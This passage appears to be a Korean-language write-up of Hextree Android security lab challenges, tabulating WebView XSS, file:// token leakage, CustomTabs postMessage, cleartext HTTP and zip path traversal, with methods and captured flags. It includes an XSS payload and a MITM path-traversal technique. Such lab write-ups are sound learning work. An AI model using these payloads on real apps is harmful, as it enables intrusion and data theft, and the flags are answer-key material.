| 39 | WebView XSS | `innerHTML` 템플릿 삽입 | `<img src=x onerror=hextree.success()>` | `HXT{webview-xss-1hsa1njs}` |
| 40 | Leak via file:// | `setAllowUniversalAccessFromFileURLs(true)` | Flag35 로 exploit.html 삽입 → XHR 로 token.txt 유출 | `HXT{leak-fileprovider-1gash2}` |
| 41 | CustomTabs PostMessage | 채널이 **현재 로드된 페이지**와 연결 | 로컬 서버 페이지에서 `{"message":"success"}` | `HXT{post-message-origin-h19sba3}` |

### Network Interception — `io.hextree.pocketmaps`

| # | 이름 | 취약 원인 | 획득 방법 | 플래그 |
|---|---|---|---|---|
| 64 | 평문 HTTP 트래픽 | 지도 목록/파일을 `http://` 로 받음 | 목록 JSON 안의 `hextree-flag` | `HXT{cleartext-traffic-g19g2is}` |
| 65 | zip path traversal | 압축 해제 시 엔트리 경로 미검증 | iptables DNAT 로 MITM → `../../downloads/hax` 엔트리 zip 서빙 | `HXT{zip-path-traversal-1sg17}` |

### 마무리

시간이 제일 오래 걸린 건 Weather 앱의 API 호출과 PocketHexMap 의 네트워크 쪽이었습니다.

- **#61** — 정상 요청을 그대로 재구성했는데도 플래그가 없어서 한참 붙잡고 있었습니다. 결국 서버
  응답 XML 에 흘려 둔 힌트(`Find correct zip code to get flag`)와, 앱 코드에서 특별 취급되던
  상수(`13337`, `42`)를 연결해서 풀었습니다. `zipCodeList=42` 로 부르니 응답 안에 있었습니다.
- **#64** — 지도 목록을 평문 HTTP 로 받아 온다는 걸 확인하고, 오가는 JSON 을 그대로 들여다봤습니다.
- **#65** — 앱이 전역 프록시를 타지 않아서 root 로 iptables DNAT 를 걸어 트래픽을 가져왔습니다.
  `../../downloads/hax` 엔트리를 넣은 가짜 지도 zip 을 서빙하니 앱이 압축을 풀면서 지정 폴더 밖에
  파일을 만들었고, 그때 잠깐 뜨는 Toast 를 Frida 로 후킹해 플래그를 받았습니다.
